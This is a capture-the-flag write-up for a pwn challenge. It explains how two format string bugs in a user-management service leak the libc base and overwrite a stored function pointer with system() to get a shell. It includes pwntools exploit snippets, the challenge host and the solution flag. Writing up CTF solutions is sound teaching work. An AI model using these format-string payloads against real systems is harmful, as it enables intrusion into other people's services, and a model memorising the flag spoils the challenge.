# Another ret to libc


**Category:** Pwn

**Points:** 997

**Description:**

Kackers are hiding some crucial information here. We don't know what exactly it is, but can you help us to retrive it? 

`nc tasks.open.kksctf.ru 10001`

libc: https://drive.google.com/open?id=1t9G-yAWk0c8eLTlDZ45DstV0UqmrScgS

@oldwayfarer

## WriteUp

### Main idea
There is two main vulnerabilities in this programm. The first one is a format string bug in user generation (part with id generation), that can possibly lead to leak of libc base. The second one is again a format string vulnerability, but this time it can help us to overflow the inner buffer of the user structure and overwrite stored addresses of functions in it with system.

### Exploitation
First of all exploiting the first format string vulnerability to leak the libc base. User id is a bitwise XOR of 8 bytes of name with some gamma. Using the format string in snprintf() we can insert address of libc_start_main into the id

    s.sendline("%10$08x") 
    s.sendline("123")
    s.sendline("1")
    s.sendline("1")
    s.recvuntil("#")

Then retriving address from id

    id_ = s.recvline()[:-2]
    leak = [id_[i:i+2] for i in range(0, len(id_), 2)]
    leak = int("".join([chr(int(leak[i], 16)^gamma[i]) for i in range(len(leak))]), 16)

After that we need to exploit the second format string. Addressess of change_username and get_user_info functions are stored in the user structure and have a one peremeter - pointer to user structure. We can overflow a name field with format string by changing how many characters to print in %x specifier (e.g. %1337x) and then overwrite an address of change_username with system in this case parameter will be considered as a pointer to string nither a pointer to user structure. Name field is the first field in user structure so we can just pass /bin/sh string in the begining of it.

    s.sendline("2")
    payload = sh + "%{}x".format(str(272 - len(sh)))
    payload += p32(leak - 249 - libc_start_main + libc_system)

And the last part is to send payload, get shell and enjoy how awesome we are

    s.sendline(payload)
    s.sendline("2")
    s.sendline("2")
    s.interactive() #getting the shell

flag: `kks{50_cl053_bu7_inr34chb!3}`

example: [break.py](break.py)
